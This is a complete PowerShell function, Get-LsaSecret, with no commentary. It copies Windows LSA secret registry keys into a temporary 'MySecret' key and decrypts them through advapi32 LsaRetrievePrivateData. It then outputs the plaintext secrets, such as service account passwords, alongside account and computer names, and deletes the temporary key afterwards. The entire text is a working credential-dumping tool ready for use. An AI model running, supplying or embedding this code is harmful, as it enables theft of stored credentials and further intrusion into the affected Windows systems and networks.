function Get-LsaSecret {
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory=$False)]
        [String]
        $RegistryKey
    )
    Begin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
      Write-Warning "Run the Command as an Administrator"
      Break
    }
    if([System.IntPtr]::Size -eq 8) {
      Write-Warning "Run PowerShell in 32-bit mode"
      Break
    }
    if([string]::IsNullOrEmpty($registryKey)) {
      [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
    }
    if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
      mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
    }
    $signature = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING
    {
      public UInt16 Length;
      public UInt16 MaximumLength;
      public IntPtr Buffer;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES
    {
      public int Length;
      public IntPtr RootDirectory;
      public LSA_UNICODE_STRING ObjectName;
      public uint Attributes;
      public IntPtr SecurityDescriptor;
      public IntPtr SecurityQualityOfService;
    }
    public enum LSA_AccessPolicy : long
    {
      POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
      POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
      POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
      POLICY_TRUST_ADMIN = 0x00000008L,
      POLICY_CREATE_ACCOUNT = 0x00000010L,
      POLICY_CREATE_SECRET = 0x00000020L,
      POLICY_CREATE_PRIVILEGE = 0x00000040L,
      POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
      POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
      POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
      POLICY_SERVER_ADMIN = 0x00000400L,
      POLICY_LOOKUP_NAMES = 0x00000800L,
      POLICY_NOTIFICATION = 0x00001000L
    }
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaRetrievePrivateData(
      IntPtr PolicyHandle,
      ref LSA_UNICODE_STRING KeyName,
      out IntPtr PrivateData
    );
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaStorePrivateData(
      IntPtr policyHandle,
      ref LSA_UNICODE_STRING KeyName,
      ref LSA_UNICODE_STRING PrivateData
    );
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaOpenPolicy(
      ref LSA_UNICODE_STRING SystemName,
      ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
      uint DesiredAccess,
      out IntPtr PolicyHandle
    );
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaNtStatusToWinError(
      uint status
    );
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaClose(
      IntPtr policyHandle
    );
    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaFreeMemory(
      IntPtr buffer
    );
"@
    Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
    }
    Process{
    foreach($key in $RegistryKey) {
        $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
        $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
        $myKey = "MySecret"
        if(Test-Path $regPath) {
        Try {
            Get-ChildItem $regPath -ErrorAction Stop | Out-Null
        }
        Catch {
            Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
            Break
        }      
        if(Test-Path $regPath) {
            "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
            $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
            $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_
            if( -not(Test-Path $copyTo) ) {
                mkdir $copyTo | Out-Null
            }
            $item = Get-ItemProperty $copyFrom
            Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
            }
        }
        $Script:pastevalue
        $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
        $objectAttributes.Length = 0
        $objectAttributes.RootDirectory = [IntPtr]::Zero
        $objectAttributes.Attributes = 0
        $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
        $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero
        $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $localsystem.Buffer = [IntPtr]::Zero
        $localsystem.Length = 0
        $localsystem.MaximumLength = 0
        $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
        $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
        $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)
        $lsaPolicyHandle = [IntPtr]::Zero
        [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
        $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)
        if($lsaOpenPolicyHandle -ne 0) {
            Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
            Continue
        }
        $privateData = [IntPtr]::Zero
        $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)
        $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)
        $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)
        if($lsaNtStatusToWinError -ne 0) {
            Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
        }
        [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
        [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type][LSAUtil.LSAUtil+LSA_UNICODE_STRING])
        Try {
            [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
            $value = $value.SubString(0, ($lusSecretData.Length / 2))
        }
        Catch {
            $value = ""
        }
        if($key -match "^_SC_") {
            $serviceName = $key -Replace "^_SC_"
            Try {
            $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
            $account = $service.StartName
            }
            Catch {
            $account = ""
            }
        } else {
            $account = ""
        }
        $obj = New-Object PSObject -Property @{
            Name = $key;
            Secret = $value;
            Account = $Account
        } 
        $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
        } 
        else {
        Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
        }
    }
    }
  end {
    if(Test-Path $tempRegPath) {
      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
    }
  }
}
